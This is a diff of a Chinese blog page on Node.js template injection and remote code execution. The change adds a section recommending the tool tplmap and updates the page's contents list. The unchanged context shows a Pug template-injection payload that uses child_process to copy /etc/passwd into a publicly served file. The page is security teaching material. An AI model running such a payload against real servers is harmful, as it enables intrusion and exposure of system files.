@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="Origin of Ray">
 <meta property="og:description" content="Node.js 允许你在浏览器之外运行 JavaScript。由于 Node.js 具有精简，快速和 跨平台的特性， 所以它可以通过统一堆栈来大大简化项目。虽然 Node.js 不是 Web 服务器，但它允许服务器(可以用 JavaScript 编程的东西)存在于实际 Web 客户端之外的环境中。随着 Node.js 越来越流行，它的安全问题是黑客与安全研究人员的焦点。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2021-09-21T03:31:38.046Z">
+<meta property="og:updated_time" content="2021-09-21T03:48:16.778Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS 模版注入与远程代码执行">
 <meta name="twitter:description" content="Node.js 允许你在浏览器之外运行 JavaScript。由于 Node.js 具有精简，快速和 跨平台的特性， 所以它可以通过统一堆栈来大大简化项目。虽然 Node.js 不是 Web 服务器，但它允许服务器(可以用 JavaScript 编程的东西)存在于实际 Web 客户端之外的环境中。随着 Node.js 越来越流行，它的安全问题是黑客与安全研究人员的焦点。">
@@ -405,6 +405,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x = global.process.mainModule.require</span><br><span class="line">x(&apos;child_process&apos;).exec(&apos;cat /etc/passwd &gt;&gt; /opt/web/chatSupportSystems/public/account.txt&apos;)</span><br></pre></td></tr></table></figure>
 
 <p>这样，我们再访问account.txt文件时，就可以获取所有的passwd了。</p>
+<h2 id="如何快速找到模版引擎中的代码漏洞"><a href="#如何快速找到模版引擎中的代码漏洞" class="headerlink" title="如何快速找到模版引擎中的代码漏洞"></a>如何快速找到模版引擎中的代码漏洞</h2><p>可以使用tplmap来查找漏洞，使用方式与sqlmap差不多。</p>
 
       
     </div>
@@ -613,7 +614,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#模版引擎"><span class="nav-number">1.</span> <span class="nav-text">模版引擎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模版注入"><span class="nav-number">2.</span> <span class="nav-text">模版注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PUG-模版注入实战"><span class="nav-number">2.1.</span> <span class="nav-text">PUG 模版注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串嵌入，转译"><span class="nav-number">2.1.1.</span> <span class="nav-text">字符串嵌入，转译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串嵌入，不转译"><span class="nav-number">2.1.2.</span> <span class="nav-text">字符串嵌入，不转译</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-远程代码执行"><span class="nav-number">3.</span> <span class="nav-text">RCE(远程代码执行)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shell执行"><span class="nav-number">3.1.1.</span> <span class="nav-text">shell执行</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#模版引擎"><span class="nav-number">1.</span> <span class="nav-text">模版引擎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模版注入"><span class="nav-number">2.</span> <span class="nav-text">模版注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PUG-模版注入实战"><span class="nav-number">2.1.</span> <span class="nav-text">PUG 模版注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串嵌入，转译"><span class="nav-number">2.1.1.</span> <span class="nav-text">字符串嵌入，转译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串嵌入，不转译"><span class="nav-number">2.1.2.</span> <span class="nav-text">字符串嵌入，不转译</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-远程代码执行"><span class="nav-number">3.</span> <span class="nav-text">RCE(远程代码执行)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shell执行"><span class="nav-number">3.1.1.</span> <span class="nav-text">shell执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何快速找到模版引擎中的代码漏洞"><span class="nav-number">4.</span> <span class="nav-text">如何快速找到模版引擎中的代码漏洞</span></a></li></ol></div>
             
 
           </div>
